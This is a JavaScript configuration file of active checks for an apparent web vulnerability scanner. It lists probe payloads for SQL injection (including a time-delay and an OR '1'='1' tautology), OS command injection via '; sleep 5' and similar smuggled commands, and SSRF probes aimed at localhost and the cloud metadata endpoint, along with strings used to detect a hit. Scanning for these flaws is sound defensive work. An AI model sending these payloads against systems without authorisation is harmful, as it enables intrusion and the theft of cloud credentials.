export const activeChecks = [
    {
        title: "Active SQLI: SQL Injection",
        params: [
            "'",
            "\"'",
            "'; WAITFOR DELAY '0:0:5'--",
            "'' OR '1'='1"
        ],
        detectResponses: [
            "syntax error",
            "order by",
            "unclosed quotation mark"
        ],
        tags: ["get-param"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Active OS Command Injection",
        params: [
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5"
        ],
        tags: ["get-param"],
        dog: "dog-omg",
        critLevel: 3
    },
    {
        title: "Active SSRF",
        params: [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/"
        ],
        detectResponses: [
            "ssh",
            "redis",
            "ami-id"
        ],
        tags: ["get-param"],
        dog: "dog-omg",
        critLevel: 3
    }
];